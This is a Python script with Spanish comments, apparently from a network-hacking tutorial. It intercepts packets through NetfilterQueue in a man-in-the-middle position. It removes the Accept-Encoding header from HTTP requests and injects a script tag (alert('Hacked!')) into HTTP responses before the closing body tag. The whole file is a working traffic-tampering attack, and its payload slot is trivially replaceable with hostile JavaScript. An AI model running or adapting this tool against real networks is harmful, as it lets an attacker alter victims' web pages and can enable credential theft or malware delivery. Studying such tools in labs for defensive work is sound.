#!/usr/bin/env python3
# Indica que el script se ejecutará usando Python 3.

import netfilterqueue  # Importa la biblioteca NetfilterQueue para interactuar con la cola de paquetes del sistema.
import scapy.all as scapy  # Importa la biblioteca Scapy, que permite manipular y analizar paquetes de red.
import re  # Importa la biblioteca 're' para trabajar con expresiones regulares.

def set_load(packet, load):
    """Modifica el contenido del paquete (payload) con el valor especificado en 'load'."""
    packet[scapy.Raw].load = load  # Cambia el contenido del paquete Raw.

    # Elimina los valores antiguos de longitud y checksum para que Scapy los recalcule.
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet  # Devuelve el paquete modificado.

def process_packet(packet):
    """Procesa cada paquete recibido, inspecciona su contenido y lo modifica si cumple ciertas condiciones."""
    scapy_packet = scapy.IP(packet.get_payload())
    # Convierte el paquete a un objeto Scapy para manipularlo.

    if scapy_packet.haslayer(scapy.Raw):  # Comprueba si el paquete tiene una capa Raw (datos de la aplicación).
        try:
            if scapy_packet[scapy.TCP].dport == 80: # Si el paquete tiene como destino el puerto 80 (HTTP):
                # Modifica el encabezado 'Accept-Encoding' para deshabilitar la compresión.
                modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
                # Crea un nuevo paquete con el contenido modificado.
                new_packet = set_load(scapy_packet, modified_load)
                # Reemplaza el paquete original con el paquete modificado.
                packet.set_payload(new_packet.build())
            elif scapy_packet[scapy.TCP].sport == 80:
                # Si el paquete proviene del puerto 80 (respuesta HTTP):
                # Modifica el contenido de la respuesta HTTP.
                modified_load = scapy_packet[scapy.Raw].load.replace(b"</body>", b"<script>alert('Hacked!');</script></body>")
                # Crea un nuevo paquete con el contenido modificado.
                new_packet = set_load(scapy_packet, modified_load)
                # Reemplaza el paquete original con el paquete modificado.
                packet.set_payload(new_packet.build())
        except Exception as e:
            print(f"Error processing packet: {e}")

    packet.accept()  # Acepta el paquete para que continúe su camino.

def main():
    # Crea una instancia de NetfilterQueue y asigna la función process_packet para procesar los paquetes.
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    try:
        print("[*] Starting packet interception...")
        queue.run()
    except KeyboardInterrupt:
        print("\n[!] Stopping packet interception...")
        queue.unbind()

if __name__ == "__main__":
    main()